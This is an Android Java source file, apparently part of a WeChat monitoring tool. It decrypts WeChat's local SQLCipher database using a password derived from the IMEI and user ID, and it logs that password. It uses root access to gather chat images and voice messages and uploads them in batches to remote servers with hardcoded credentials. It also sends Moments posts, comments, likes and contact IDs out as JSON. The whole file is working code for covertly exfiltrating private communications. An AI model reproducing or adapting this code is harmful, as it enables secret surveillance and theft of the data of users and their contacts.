package live_library.wechat2.uploadpic;

import android.annotation.SuppressLint;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.blankj.utilcode.util.FileUtils;
import com.blankj.utilcode.util.SPUtils;
import com.blankj.utilcode.util.StringUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.xuexiang.xhttp2.XHttp;
import com.xuexiang.xhttp2.callback.impl.IProgressResponseCallBack;
import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
import com.yanzhenjie.kalle.FormBody;
import com.yanzhenjie.kalle.JsonBody;
import com.yanzhenjie.kalle.Kalle;
import com.yanzhenjie.kalle.KalleConfig;
import com.yanzhenjie.kalle.simple.SimpleResponse;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.dom4j.Document;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.TimeZone;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;

import live_library.wechat2.ConfigWechat;
import live_library.wechat2.UploadService;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.sns.Config;
import live_library.wechat2.sns.Model.SnsInfo;
import live_library.wechat2.sns.QueryCallBack;
import live_library.wechat2.sns.Share;
import live_library.wechat2.sns.SnsStat;
import live_library.wechat2.sns.Task;
import live_library.wechatlog.RLog;
import live_library.wechatutils.RootUtil;

import static android.content.Context.MODE_PRIVATE;
import static android.content.Context.TELEPHONY_SERVICE;
import static live_library.wechat2.db.SqlDataUtil.WX_DB_FILE_NAME_Index;
import static live_library.wechatutils.RootUtil.getDbPassword;

public class UploadPicService {

    public static final String TAG = "UploadPicService";
    private static volatile UploadPicService mInstance;
    private SQLiteDatabase fileIndeDb;
    private File copyWxDataDb;
    private String endtime="";//上传成功数据的最后一条的时间

            Task task = null;
    SnsStat snsStat = null;
    ArrayList<FileIndexBean> listAmr;
    String mwxid;
    private float pageSize=25f;
    private int pageSizeInt=25;
    public static UploadPicService getInstance() {
        mInstance = new UploadPicService();
        return mInstance;
    }
    public void openRuning(String wxid){

        mwxid = wxid;
        task = new Task(UploadService.getContext());
        RunningTask runningTask = new RunningTask();
        runningTask.execute();
        try {
            runningTask.get();
        } catch (ExecutionException e) {
            RLog.d(TAG, "RunningTask-ExecutionException:" , e);
        } catch (InterruptedException e) {
            RLog.d(TAG, "RunningTask-InterruptedException:" , e);
        }

    }
    public void openData(String wxid) {//WX_DB_FILE_NAME_Index
//        mwxid = wxid;
//        task = new Task(UploadService.getContext());
//        new RunningTask().execute();
        String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
        RLog.d(TAG, "第一个微信聊天图片数据库路径:" + SqlDataUtil.WX_DB_DIR_PATH() + userFileName);
        //原始数据库
        File file = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/"+ WX_DB_FILE_NAME_Index);
        if (file != null) {
            RLog.d(TAG, "查找到微信数据库路径:" + file.getAbsolutePath());
            copyWxDataDb = new File(SqlDataUtil.WX_DB_DIR_PATH()+userFileName + "/" + WX_DB_FILE_NAME_Index);
        }
        if (fileIndeDb != null) {
            fileIndeDb.close();
        }
        try {
            fileIndeDb = openCommonWxDb(copyWxDataDb, getImei());
            ArrayList<FileIndexBean> list = getFileList(fileIndeDb);
            listAmr = getFileAmrList(fileIndeDb);
            RLog.i(TAG, "FileIndexBean=list=size==" + list.size());
            RLog.i(TAG, "FileIndexBean=listAmr=size==" + listAmr.size());
            if (list != null && list.size() > 0) {
                try {
                    int pageCount = (int) Math.ceil(list.size() / pageSize);
                    if (list.size() < pageSize) {
                        pageCount = 1;
                    }
                    CountDownLatch countDownLatch = new CountDownLatch(pageCount);
                    httpSendPic(wxid, pageCount, 0, countDownLatch, list);
                    countDownLatch.await();
                } catch (Exception e) {

                }

            }
            if (listAmr != null && listAmr.size() > 0) {
                try {
                    int pageCount = (int) Math.ceil(listAmr.size() / pageSize);
                    if (listAmr.size() < pageSize) {
                        pageCount = 1;
                    }
                    CountDownLatch countDownLatch = new CountDownLatch(pageCount);
                    httpSendAMr(wxid, pageCount, 0, countDownLatch, listAmr);
                    countDownLatch.await();
                } catch (Exception e) {

                }
            }
            if (fileIndeDb != null) {
                fileIndeDb.close();
            }
        }catch (Exception e){
            RLog.d(TAG, "上传图片或者语音出错 ");
        }
    }

    public void httpSendPic(final String wxid,final int totalCount,final int currentCount,final CountDownLatch countDownLatch,final ArrayList<FileIndexBean> list) {
//        File file = new File(Config.SD_DIR+"559307a1e0cd223d1db73f0fc0dc7f19/image2/0b/82/0b8248f3379e205b4e3ba0798320ca65.jpg");
        RLog.d(TAG, "httpSendPic currentCount: "+currentCount+"; totalCount"+totalCount);
        if (currentCount == totalCount) {
            RLog.d(TAG, "httpSendPic 结束传输数据 ");
            return;
        }
        List<File> listFiles = new ArrayList();
        File filePic;
        String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
        int size = (currentCount*pageSizeInt)+pageSizeInt;
//        for (int i = currentCount*pageSize; i < (list.size()>pageSize?(currentCount*pageSize+pageSize):list.size()); i++) {
        for (int i = currentCount*pageSizeInt; i < (list.size()>size?size:list.size()); i++) {
            if (!StringUtils.isEmpty(list.get(i).getPath())) {
                filePic = new File(Config.SD_DIR + list.get(i).getPath());
//                RLog.i(TAG, "FileIndexBean=filePath:" +list.get(i).getPath());
                if (!filePic.exists()) {
                    String [] strings = list.get(i).getPath().split("image2");
                    String path = SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/image2"+strings[1];
                    String path21 = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.tencent.mm/MicroMsg/" + userFileName+"/image2"+strings[1];
                    String [] pathArray21 = path21.split("/");
                    String pathnew21 = pathArray21[pathArray21.length-1];
                    String pathPic21 = SqlDataUtil.WX_DB_DIR_PATH() +"/"+pathnew21;
                    RootUtil.moveFile(path21,pathPic21);
                    String path22 = Config.SD_DIR_0_ARM + list.get(i).getPath();
                    String [] pathArray22 = path22.split("/");
                    String pathnew22 = pathArray22[pathArray22.length-1];
                    String pathPic22 = SqlDataUtil.WX_DB_DIR_PATH() +"/"+pathnew22;
                    RootUtil.moveFile(path22,pathPic22);
//                    RLog.i(TAG, "FileIndexBean=path:" +path);
                    if (new File(path).exists()) {
                        listFiles.add(new File(path));
                        endtime = list.get(i).getMsgtime();
                    }else {
                        File f = new File(pathPic21);
                        if (f.exists()){
                            listFiles.add(f);
                            endtime = list.get(i).getMsgtime();
                        }else {
                            filePic = new File(Config.SD_DIR_0_ARM + list.get(i).getPath());
                            if (filePic.exists()) {
                                listFiles.add(filePic);
                                endtime = list.get(i).getMsgtime();

//                                listFiles.add(filePic);
//                                endtime = list.get(i).getMsgtime();
                            }else {
                                RLog.i(TAG, "图片未找到=path:" +list.get(i).getPath());

                            }
                        }

                    }
                }else {
                    listFiles.add(filePic);
                    endtime = list.get(i).getMsgtime();
                }

            }
        }
        if (listFiles.size() < 1){
            releaseCountDownLatch(currentCount, totalCount, countDownLatch);
            return;
        }
        FormBody body = FormBody.newBuilder()
                .param("appid", "ossa568ok")
                .param("appsecret", "uiuo3q0m")
                .files("file", listFiles).build();
        KalleConfig config = KalleConfig.newBuilder().connectionTimeout(50,TimeUnit.SECONDS)
        .readTimeout(50,TimeUnit.SECONDS)
        .build();
        Kalle.setConfig(config);
        Kalle.post(ConfigWechat.uploadFilePicOSS).body(body).perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
//                RLog.d(TAG, "response-httpSendPic: " + response.succeed());
                try {
                    if (!StringUtils.isEmpty(response.succeed())) {
                        JSONObject jsonObject = new JSONObject(response.succeed());
                        String data = jsonObject.getJSONArray("data").toString();
                        httpPicAddress(endtime, wxid, data,countDownLatch,currentCount,totalCount,list);
                    }
                }catch (Exception e){
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                    RLog.i(TAG, "FileIndexBean=uploadFilePicOSS:" + e.getMessage());
                }

            }
        });
    }
    public void httpSendAMr(final String wxid,final int totalCount,final int currentCount,final CountDownLatch countDownLatch,final ArrayList<FileIndexBean> list) {
//        File file = new File(Config.SD_DIR+"559307a1e0cd223d1db73f0fc0dc7f19/image2/0b/82/0b8248f3379e205b4e3ba0798320ca65.jpg");
        if (currentCount == totalCount) {
            RLog.d(TAG, "httpSendAMr 结束传输数据 ");
            return;
        }
        List<File> listFiles = new ArrayList();
        File filePic;
        int size = (currentCount*pageSizeInt)+pageSizeInt;
        for (int i = currentCount*pageSizeInt; i < (list.size()>size?(size):list.size()); i++) {
            String path11 = Config.SD_DIR_ARM + list.get(i).getPath();
            String[] pathArray1 = path11.split("/");
            String pathnew1 = pathArray1[pathArray1.length - 1];
            String pathAmr1 = SqlDataUtil.WX_DB_DIR_PATH() + "/" + pathnew1;
            RootUtil.moveFile(path11, pathAmr1);

            String path12 = Config.SD_DIR_1_ARM_default + list.get(i).getPath();
            String[] pathArray12 = path12.split("/");
            String pathnew12 = pathArray12[pathArray12.length - 1];
            String pathAmr12 = SqlDataUtil.WX_DB_DIR_PATH() + "/" + pathnew12;
            RootUtil.moveFile(path12, pathAmr12);

            String path13 = Config.SD_DIR_0_ARM + list.get(i).getPath();
            String[] pathArray13 = path13.split("/");
            String pathnew13 = pathArray13[pathArray13.length - 1];
            String pathAmr13 = SqlDataUtil.WX_DB_DIR_PATH() + "/" + pathnew13;
            RootUtil.moveFile(path13, pathAmr13);
            filePic = new File(pathAmr1);
            if (filePic.exists()) {
                listFiles.add(filePic);
                endtime = list.get(i).getMsgtime();
            } else {//mnt/pass_through/999/emulated/999/Android/data/com.tencent.mm/MicroMsg/
                filePic = new File(pathAmr12);
                if (filePic.exists()) {
                    listFiles.add(filePic);
                    endtime = list.get(i).getMsgtime();
                } else {
                    filePic = new File(pathAmr13);
                    if (filePic.exists()) {
                        listFiles.add(filePic);
                        endtime = list.get(i).getMsgtime();
                    }else {
                        filePic = new File(Config.SD_DIR_1_ARM_default + list.get(i).getPath());
                        if (filePic.exists()) {
                            listFiles.add(filePic);
                            endtime = list.get(i).getMsgtime();
                        }else {
                            RLog.i(TAG, "语音未找到=path:" + list.get(i).getPath());
                        }
                    }
                }
            }

        }
        if (listFiles.size() < 1){
            releaseCountDownLatch(currentCount, totalCount, countDownLatch);
            return;
        }
        FormBody body = FormBody.newBuilder()
                .param("appid", "oss68wyy1")
                .param("appsecret", "678gau1s")
                .files("file", listFiles).build();
        KalleConfig config = KalleConfig.newBuilder().connectionTimeout(50,TimeUnit.SECONDS)
                .readTimeout(50,TimeUnit.SECONDS)
                .build();
        Kalle.setConfig(config);
        Kalle.post(ConfigWechat.uploadFileAmrOSS).body(body).perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
//                RLog.d(TAG, "response-httpSendPic: " + response.succeed());
                try {
                    if (!StringUtils.isEmpty(response.succeed())) {
                        JSONObject jsonObject = new JSONObject(response.succeed());
                        String data = jsonObject.getJSONArray("data").toString();
//                        httpAmrAddress(endtime, wxid, data);
                        httpAmrAddress(endtime, wxid, data,countDownLatch,currentCount,totalCount,list);
                    }
                }catch (Exception e){
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                    RLog.i(TAG, "FileIndexBean=uploadFileAmrOSS:" + e.getMessage());
                }

            }
        });
    }
    public void httpPicAddress(final String endtime,String vxid, String data,final CountDownLatch countDownLatch,final int currentCount,final int totalCount,final ArrayList<FileIndexBean> list){
        JsonBody body = new JsonBody(data);
        Kalle.post(ConfigWechat.uploadPicAddresss+vxid).body(body).perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
                try {
                    JSONObject jsonObject = new JSONObject(response.succeed());
                    int data = jsonObject.optInt("status");
                    if (200==data){
                        SPUtils.getInstance().put("msgtime", endtime);
                        countDownLatch.countDown();
                        httpSendPic(vxid, totalCount,currentCount+1,countDownLatch,list);
                    }else {
                        RLog.d(TAG, "httpPicAddress 传输数据失败 ：【" +data + "】");
                        releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                    }
//                    httpSendAMr(vxid,listAmr);

                }catch (Exception e){
                    RLog.d(TAG, "httpPicAddress 传输数据失败 ：【" +data + "】");
                    releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                }
//                RLog.d(TAG, "response-httpPicAddress: " + response.succeed());

            }

            @Override
            public void onException(Exception e) {
                super.onException(e);
                RLog.d(TAG, "httpPicAddress 传输数据失败 ：【" +e.getMessage() + "】");
                releaseCountDownLatch(currentCount, totalCount, countDownLatch);
            }
        });


    }
    public void releaseCountDownLatch(int currentCount, int totalCount, CountDownLatch countDownLatch) {
        for (int i = 0; i < totalCount - currentCount; i++) {
            countDownLatch.countDown();
        }
    }
    public void httpAmrAddress(final String endtime,String vxid, String data,final CountDownLatch countDownLatch,final int currentCount,final int totalCount,final ArrayList<FileIndexBean> list){
        JsonBody body = new JsonBody(data);
        Kalle.post(ConfigWechat.uploadAmrAddresss+vxid).body(body).perform(new QueryCallBack<String>() {

            @Override
            public void onResponse(SimpleResponse<String, String> response) {
                try {
                    JSONObject jsonObject = new JSONObject(response.succeed());
                    int data = jsonObject.optInt("status");
                    if (200==data){
                        SPUtils.getInstance().put("msgtimeAmr", endtime);
                        countDownLatch.countDown();
                        httpSendAMr(vxid, totalCount,currentCount+1,countDownLatch,list);
                    }else {
                        RLog.d(TAG, "httpAmrAddress 传输数据失败 ：【" +data + "】");
                        releaseCountDownLatch(currentCount, totalCount, countDownLatch);
                    }

                }catch (Exception e){
                        RLog.d(TAG, "httpAmrAddress 传输数据失败 ：【" +data + "】");
                        releaseCountDownLatch(currentCount, totalCount, countDownLatch);

                }
//                RLog.d(TAG, "response-httpAmrAddress: " + response.succeed());

            }
            @Override
            public void onException(Exception e) {
                super.onException(e);
                RLog.d(TAG, "httpAmrAddress 传输数据失败 ：【" +e.getMessage() + "】");
                releaseCountDownLatch(currentCount, totalCount, countDownLatch);
            }
        });


    }

    public static ArrayList<FileIndexBean> getFileList(SQLiteDatabase fileIndeDb) {
            ArrayList<FileIndexBean> fileIndexBeans = new ArrayList<>();
        try {
            Cursor cursor = fileIndeDb.query("WxFileIndex2", null, null, null, null, null, "msgtime asc");
            while (cursor.moveToNext()) {
                FileIndexBean fileIndexBean = new FileIndexBean();
                String path = cursor.getString(cursor.getColumnIndex("path"));
                String msgType = cursor.getString(cursor.getColumnIndex("msgType"));
                String msgSubType = cursor.getString(cursor.getColumnIndex("msgSubType"));
                String msgtime = cursor.getString(cursor.getColumnIndex("msgtime"));
                String size = cursor.getString(cursor.getColumnIndex("size"));
                String msgId = cursor.getString(cursor.getColumnIndex("msgId"));
                String username = cursor.getString(cursor.getColumnIndex("username"));
                fileIndexBean.setPath(path);
                fileIndexBean.setMsgType(msgType);
                fileIndexBean.setMsgSubType(msgSubType);
                fileIndexBean.setMsgtime(msgtime);
                fileIndexBean.setSize(size);
                fileIndexBean.setMsgId(msgId);
                fileIndexBean.setUsername(username);
                String msgtimeSP = SPUtils.getInstance().getString("msgtime");
                if (StringUtils.isEmpty(msgtimeSP)) {//第一次
                    if ("21".equals(msgSubType)) {
//                        SPUtils.getInstance().put("msgtime", msgtime);
                        fileIndexBeans.add(fileIndexBean);
                    }
                } else if (!StringUtils.isEmpty(msgtime)) {
                    Long timeSPl = Long.parseLong(msgtimeSP);
                    Long msgtimel = Long.parseLong(msgtime);
                    if ("21".equals(msgSubType) && msgtimel > timeSPl) {
//                        SPUtils.getInstance().put("msgtime", msgtime);
                        fileIndexBeans.add(fileIndexBean);
                    }
                }
            }

            cursor.close();
            return fileIndexBeans;
        }catch (Exception e){
            return fileIndexBeans;
        }
    }
    public static ArrayList<FileIndexBean> getFileAmrList(SQLiteDatabase fileIndeDb) {
            ArrayList<FileIndexBean> fileIndexBeans = new ArrayList<>();
        try {
            Cursor cursor = fileIndeDb.query("WxFileIndex2", null, null, null, null, null, "msgtime asc");
            while (cursor.moveToNext()) {
                FileIndexBean fileIndexBean = new FileIndexBean();
                String path = cursor.getString(cursor.getColumnIndex("path"));
                String msgType = cursor.getString(cursor.getColumnIndex("msgType"));
                String msgSubType = cursor.getString(cursor.getColumnIndex("msgSubType"));
                String msgtime = cursor.getString(cursor.getColumnIndex("msgtime"));
                String size = cursor.getString(cursor.getColumnIndex("size"));
                String msgId = cursor.getString(cursor.getColumnIndex("msgId"));
                String username = cursor.getString(cursor.getColumnIndex("username"));
                fileIndexBean.setPath(path);
                fileIndexBean.setMsgType(msgType);
                fileIndexBean.setMsgSubType(msgSubType);
                fileIndexBean.setMsgtime(msgtime);
                fileIndexBean.setSize(size);
                fileIndexBean.setMsgId(msgId);
                fileIndexBean.setUsername(username);
                String msgtimeSP = SPUtils.getInstance().getString("msgtimeAmr");
                if (StringUtils.isEmpty(msgtimeSP)) {//第一次
                    long current=System.currentTimeMillis();//当前时间毫秒数
                    long zero=current/(1000*3600*24)*(1000*3600*24)- TimeZone.getDefault().getRawOffset();//今天零点零分零秒的毫秒数
                    Long msgtimel = Long.parseLong(msgtime);
                    if ("10".equals(msgSubType)&&"34".equals(msgType)&& msgtimel > zero) {
                        fileIndexBeans.add(fileIndexBean);
                    }
                } else if (!StringUtils.isEmpty(msgtime)) {
                    Long timeSPl = Long.parseLong(msgtimeSP);
                    Long msgtimel = Long.parseLong(msgtime);
                    if ("10".equals(msgSubType)&&"34".equals(msgType) && msgtimel > timeSPl) {
//                        SPUtils.getInstance().put("msgtime", msgtime);
                        fileIndexBeans.add(fileIndexBean);
                    }
                }
            }

            cursor.close();
            return fileIndexBeans;
        }catch (Exception e){
            return fileIndexBeans;
        }
    }

    /**
     * 连接数据库
     */
    public static SQLiteDatabase openCommonWxDb(File dbFile, String imei) {
        SQLiteDatabase.loadLibs(UploadService.getContext());
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            @Override
            public void preKey(SQLiteDatabase database) {
            }

            @Override
            public void postKey(SQLiteDatabase database) {
                //兼容2.0的数据库
                database.rawExecSQL("PRAGMA cipher_migrate;");
            }
        };

        try {
            String password = getDbPassword(imei, getCurrWxUin());
            RLog.i(TAG, "密码====" + password);
            //打开数据库连接
            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, password, null, hook);
            RLog.i(TAG, " Open SQLiteDatabase 成功！");
            return db;
            //微信数据库路径:/data/data/io.va.exposed/virtual/data/user/0/com.tencent.mm/MicroMsg/21b7c922df1e19176ece481a7137e508/EnMicroMsg.db-shm
        } catch (Exception e) {
            Log.d(TAG, "读取数据库信息失败" + e.toString());
            RLog.i(TAG, " Open SQLiteDatabase 失败： " + e.toString());
            e.printStackTrace();
            return null;
        }
    }

    /**
     * 获取微信的uid
     * 微信的uid存储在SharedPreferences里面
     * 存储位置\data\data\com.tencent.mm\shared_prefs\auth_info_key_prefs.xml
     */
    public static String getCurrWxUin() {
        String mCurrWxUin = null;
        File file = new File(SqlDataUtil.WX_SP_UIN_PATH());
        try {
            if (file.exists()) {
                FileInputStream in = new FileInputStream(file);
                SAXReader saxReader = new SAXReader();
                Document document = saxReader.read(in);
                Element root = document.getRootElement();
                List<Element> elements = root.elements();
                for (Element element : elements) {
                    if ("_auth_uin".equals(element.attributeValue("name"))) {
                        mCurrWxUin = element.attributeValue("value");
                    }
                }
            }

        } catch (Exception e) {
//            new MainActivity().setLog("获取微信uid失败，请检查auth_info_key_prefs文件权限");
            RLog.d("WeChatUtil", "获取微信uid失败，请检查auth_info_key_prefs文件权限" + e.toString());
            e.printStackTrace();
        }
        return mCurrWxUin;
    }
    @SuppressLint("MissingPermission")
    public static String getImei() {
        SharedPreferences mSharedPreferences =  UploadService.getContext().getSharedPreferences("yes_getImei", MODE_PRIVATE);
        String imei = mSharedPreferences.getString("Imei", "");
        if (StringUtils.isEmpty(imei)){
            imei = SqlDataUtil.getCurrWxIMEI1();//来自微信源码
            RLog.d(TAG, "SqlDataUtil.getCurrWxIMEI1----KeyInfo的imei值为: " + imei);
        }
        if (StringUtils.isEmpty(imei)){
            imei = SqlDataUtil.getCurrWxIMEI();
            RLog.d(TAG, "SqlDataUtil.getCurrWxIMEI----IMEI_DENGTA的imei值为: " + imei);
        }

        if (StringUtils.isEmpty(imei)) {
//            SharedPreferences mSharedPreferences =  UploadService.getContext().getSharedPreferences("yes_getImei", MODE_PRIVATE);
            imei = mSharedPreferences.getString("Imei", "");
        }
        RLog.d(TAG, "最终的imei值为: " + imei);
        return imei;
    }


    class RunningTask extends AsyncTask<Void, Void, Void> {

        Throwable error = null;

        @Override
        protected Void doInBackground(Void... params) {
            try {
//                task.copySnsDB();
                String userFileName = SqlDataUtil.md5("mm" + SqlDataUtil.getCurrWxUin());
//                File wxDataDir = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName);
                //复制到本地地址sns
//                String copyFilePathsns = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_sns;
//                String copyFilePathWalsns = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_WAL_sns;
//                String copyFilePathShmsns = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_SHM_sns;
//                String copyFilePathShmini = SqlDataUtil.CURR_APK_PATH + SqlDataUtil.COPY_WX_DATA_DB_SHM_ini;
                //原始数据库sns
                File filesns = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/"+ SqlDataUtil.WX_DB_FILE_NAME_sns);
                File fileWalsns = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/"+ SqlDataUtil.WX_DB_FILE_NAME_WAL_sns);
                File fileShmsns = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/"+ SqlDataUtil.WX_DB_FILE_NAME_SHM_sns);
                File fileinisns = new File(SqlDataUtil.WX_DB_DIR_PATH() + userFileName+"/"+ SqlDataUtil.WX_DB_FILE_NAME_SHM_ini);
                if (filesns!=null){
                    //开始复制
//                    SqlDataUtil.copyFile(filesns.getAbsolutePath(), copyFilePathsns);
                }
                if (fileWalsns!=null){
                    //开始复制
//                    SqlDataUtil.copyFile(fileWalsns.getAbsolutePath(), copyFilePathWalsns);
                }
                if (fileShmsns!=null){
                    //开始复制
//                    SqlDataUtil.copyFile(fileShmsns.getAbsolutePath(), copyFilePathShmsns);
                }
                if (fileinisns!=null){
                    //开始复制
//                    SqlDataUtil.copyFile(fileinisns.getAbsolutePath(), copyFilePathShmini);
                }
                task.initSnsReader();
                task.snsReader.run();
                snsStat = new SnsStat(task.snsReader.getSnsList());
            } catch (Throwable e) {
                this.error = e;
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void voidParam) {
            super.onPostExecute(voidParam);
            Share.snsData = snsStat;
            try {
                JSONObject json1 = new JSONObject();
                json1.put("vxid",mwxid);
                JSONObject json11 = new JSONObject();
                json11.put("vxid",mwxid);
;                if (snsStat.snsList.size()>0) {
                    ArrayList<SnsInfo> snsList = snsStat.snsList;
                    JSONArray jsonArray = new JSONArray();
                    JSONArray jsonArray11 = new JSONArray();
                    for (int h = 0;h<snsList.size();h++) {
                        JSONObject jo = new JSONObject();
                        SnsInfo snsInfo = snsList.get(h);
                        jo.put("id",snsInfo.id);
                        jo.put("author",snsInfo.authorId);
                        jo.put("authorName",snsInfo.authorName);
                        jo.put("content",snsInfo.content);
                        jo.put("updateTime",snsInfo.timestamp);
                        long time = datas1(2);
//                        RLog.d(TAG, "snsInfo-content: " + snsInfo.content);
//                        RLog.d(TAG, "response-httpPicAddress-timestamp: " + snsInfo.timestamp);
//                        RLog.d(TAG, "snsInfo.authorId: " + snsInfo.authorId);
//                        RLog.d(TAG, "mwxid: " + mwxid);
                        if (snsInfo.timestamp<time){
                            continue;
                        }
                        if (!mwxid.equals(snsInfo.authorId)){
                            continue;
                        }
                        if (snsInfo.likes!=null&&snsInfo.likes.size()>0) {
                            JSONArray jsonArray1 = new JSONArray();
                            for (int i = 0; i < snsInfo.likes.size(); i++) {
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("userName",snsInfo.likes.get(i).userName );
                                jsonArray1.put(jsonObject);
                            }
                            jo.put("like",jsonArray1);
                        }
                        if (snsInfo.comments!=null&&snsInfo.comments.size()>0){
                            JSONArray jsonArray1 = new JSONArray();
                            for (int i = 0; i < snsInfo.comments.size(); i++) {
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("authorName",snsInfo.comments.get(i).authorName);
                                jsonObject.put("authorId",snsInfo.comments.get(i).authorId);
                                jsonObject.put("content",snsInfo.comments.get(i).content);
                                jsonObject.put("toUser",snsInfo.comments.get(i).toUser);
                                jsonObject.put("toUserId",snsInfo.comments.get(i).toUserId);
                                jsonArray1.put(jsonObject);
                            }
                            jo.put("comments",jsonArray1);
                        }
                        if (snsInfo.mediaList!=null&&snsInfo.mediaList.size()>0){
                            JSONArray jsonArray1 = new JSONArray();
                            for (int i = 0; i < snsInfo.mediaList.size(); i++) {
//                                JSONObject jsonObject = new JSONObject();
//                                jsonObject.put("url1",snsInfo.mediaList.get(i));
                                jsonArray1.put(snsInfo.mediaList.get(i));
                            }
                            jo.put("mediaList",jsonArray1);
//                            RLog.d(TAG, "snsInfo-mediaList-朋友圈图片: " + jsonArray1.length());
                        }
                        if (h % 2 == 0) {
                            jsonArray.put(jo);
                        }else {
                            jsonArray11.put(jo);
                        }
                    }

                    json1.put("list",jsonArray);
                    json11.put("list",jsonArray11);
                    RLog.d(TAG, "snsInfo-list-朋友圈上传条数: " + jsonArray.length());
                    JsonBody body = new JsonBody(json1.toString());
                    Kalle.post(ConfigWechat.snsUpload).body(body).perform(new QueryCallBack<String>() {

                        @Override
                        public void onResponse(SimpleResponse<String, String> response) {
                            try {
                                JSONObject jsonObject = new JSONObject(response.succeed());
                                int data = jsonObject.optInt("status");
                                if (200 == data) {
                                    JsonBody body = new JsonBody(json11.toString());
                                    Kalle.post(ConfigWechat.snsUpload).body(body).perform(new QueryCallBack<String>() {

                                        @Override
                                        public void onResponse(SimpleResponse<String, String> response) {
                                            try {
                                                JSONObject jsonObject = new JSONObject(response.succeed());
                                                int data = jsonObject.optInt("status");
                                                if (200 == data) {

                                                }

                                            } catch (Exception e) {

                                            }
                                            RLog.d(TAG, "response-snsInfo-list-朋友圈上传返回数据： " + response.succeed());

                                        }
                                    });
                                }

                            } catch (Exception e) {

                            }

                        }
                    });
                }

            }catch (Exception e){

            } finally {

            }
        }
    }
    public static long datas1(int position){
        Calendar calendar = Calendar.getInstance();
        calendar.set(calendar.get(Calendar.YEAR),calendar.get(Calendar.MONTH),calendar.get(Calendar.DAY_OF_MONTH)-2,0,0,0);
        long start_date_time = calendar.getTime().getTime()/1000;
//        RLog.d(TAG, "response-httpPicAddress-start_date_time: " + start_date_time);
        return start_date_time;
    }
}
